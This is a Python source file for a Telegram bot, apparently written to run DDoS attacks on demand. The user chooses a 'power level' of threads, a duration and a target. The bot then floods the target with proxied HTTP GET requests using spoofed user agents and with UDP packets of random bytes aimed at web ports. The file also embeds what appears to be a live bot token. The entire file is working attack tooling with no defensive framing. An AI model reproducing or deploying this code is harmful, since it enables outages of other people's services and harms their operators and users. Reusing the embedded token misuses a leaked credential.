import telebot
import socket
import threading
import time
import random
import requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- [ Configuration ] ---
TOKEN = '8671137049:AAE3N7Ibttzw8GlcnnwHxXI9UK30lFfoqDg'
bot = telebot.TeleBot(TOKEN)
session_obj = requests.Session()
PROXIES = []
user_data = {}

def get_user_agent():
    browsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera"]
    platforms = ["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "Linux; Android 11; SM-G981B"]
    return f"Mozilla/5.0 ({random.choice(platforms)}) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/90.0.4430.93"

def fetch_proxies():
    global PROXIES
    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            PROXIES = r.text.splitlines()
    except: pass

# --- [ Optimized Attack Logic ] ---
def attack_manager(chat_id, target_url, target_ip, threads, duration):
    # Attack စတင်ကြောင်း
    timeout = time.time() + duration
    
    def l7():
        while time.time() < timeout:
            try:
                proxy = random.choice(PROXIES) if PROXIES else None
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                session_obj.get(target_url, headers={'User-Agent': get_user_agent()}, proxies=proxies, timeout=3)
            except: pass

    def l4():
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(2048) # ဖုန်းအတွက် payload လျှော့ထားတာ ပိုတည်ငြိမ်တယ်
        while time.time() < timeout:
            try:
                port = random.choice([80, 443, 8080])
                client.sendto(bytes_data, (target_ip, port))
                time.sleep(0.05) # Network ပိတ်မသွားအောင် အသက်ရှုပေါက်ပေးခြင်း
            except: pass

    # Threads စတင်ခြင်း
    thread_list = []
    for i in range(threads):
        target_func = l7 if i % 2 == 0 else l4
        t = threading.Thread(target=target_func)
        t.daemon = True
        t.start()
        thread_list.append(t)

    # Duration ပြည့်အောင် စောင့်ခြင်း
    time.sleep(duration)
    
    # Attack ပြီးဆုံးကြောင်း Message ပြန်ပို့ခြင်း (Connection အဆင်ပြေအောင် ၃ ကြိမ် ကြိုးစားမယ်)
    for _ in range(3):
        try:
            bot.send_message(chat_id, "✅ **ATTACK FINISHED, MASTER!**\n━━━━━━━━━━━━━━━━━━\nTarget: `{}`\nStatus: `SUCCESS` 🏁".format(target_url), parse_mode="Markdown")
            break
        except:
            time.sleep(2)

# --- [ UI & Handlers ] ---

@bot.message_handler(commands=['start'])
def start(message):
    fetch_proxies()
    user_data[message.chat.id] = {'step': 'THREADS'}
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🌑 500", callback_data="th_500"),
        InlineKeyboardButton("🌘 1000", callback_data="th_1000"),
        InlineKeyboardButton("🌗 2000", callback_data="th_2000"),
        InlineKeyboardButton("🔥 5000", callback_data="th_5000")
    )
    
    bot.send_message(message.chat.id, "⚔️ **MASTER HYBRID ENGINE** ⚔️\n━━━━━━━━━━━━━━\n😈 **Select Power Level:**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('th_'))
def handle_threads(call):
    threads = int(call.data.split('_')[1])
    user_data[call.message.chat.id].update({'threads': threads, 'step': 'DURATION'})
    bot.edit_message_text(f"✅ **Power:** `{threads} Threads`\n━━━━━━━━━━━━━━\n🕒 **Enter Duration (Seconds):**", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get('step') == 'DURATION')
def handle_duration(message):
    try:
        duration = int(message.text.strip())
        user_data[message.chat.id].update({'duration': duration, 'step': 'URL'})
        bot.send_message(message.chat.id, f"✅ **Time:** `{duration}s`\n━━━━━━━━━━━━━━\n🌐 **Send Target URL/IP:**", parse_mode="Markdown")
    except: bot.reply_to(message, "❌ Send a number!")

@bot.message_handler(func=lambda message: user_data.get(message.chat.id, {}).get('step') == 'URL')
def handle_url(message):
    chat_id = message.chat.id
    target_url = message.text.strip()
    data = user_data[chat_id]
    
    try:
        host = target_url.replace("http://","").replace("https://","").split("/")[0]
        target_ip = socket.gethostbyname(host)
        
        bot.send_message(chat_id, "🚀 **LAUNCHING HYBRID ATTACK...**\n━━━━━━━━━━━━━━\n📍 Target: `{}`\n🔥 Threads: `{}`\n🕒 Time: `{}`s".format(target_url, data['threads'], data['duration']), parse_mode="Markdown")
        
        # Attack ကို သီးသန့် Thread နဲ့ Run လို့ Bot မပိတ်သွားတော့ဘူး
        threading.Thread(target=attack_manager, args=(chat_id, target_url, target_ip, data['threads'], data['duration'])).start()
        
        user_data[chat_id]['step'] = 'DONE'
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

if __name__ == "__main__":
    bot.remove_webhook()
    print("Bot is alive... 😈")
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
